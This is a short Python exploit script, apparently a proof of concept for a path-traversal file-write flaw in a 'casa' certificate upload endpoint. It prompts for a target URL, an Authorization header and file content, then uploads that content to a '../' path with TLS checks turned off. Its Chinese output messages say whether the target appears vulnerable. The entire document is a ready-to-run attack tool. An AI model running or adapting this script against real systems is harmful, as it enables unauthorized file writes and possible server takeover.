import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def POC_1(target_url,name,Auth,content):
    vuln_url = target_url + "/casa/private/config/slice/ha/certificate?name=" + name
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Auth,
        "Content-Type":"multipart/form-data;boundary=aad7973f2b32ac4619c4ab19d3192ca9daf4854e3c0a7b07a6edcf850890"
    }
    burp0_data = "\n--aad7973f2b32ac4619c4ab19d3192ca9daf4854e3c0a7b07a6edcf850890\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n"+content+"\r\n--aad7973f2b32ac4619c4ab19d3192ca9daf4854e3c0a7b07a6edcf850890--\r\n"

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=burp0_data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在文件写入漏洞,请检查\033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))




if __name__ == '__main__':
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    >>> \033[0m"))
    name = str(input("\033[35m输入要传入的路径和名字(注意要加../) >>> \033[0m"))
    Auth = str(input("\033[35m输入获取的Authorization认证(注意是 Basic 部分)>>> \033[0m"))
    content = str(input("\033[35m输入传入文件的内容 >>> \033[0m"))
    POC_1(target_url,name,Auth,content)
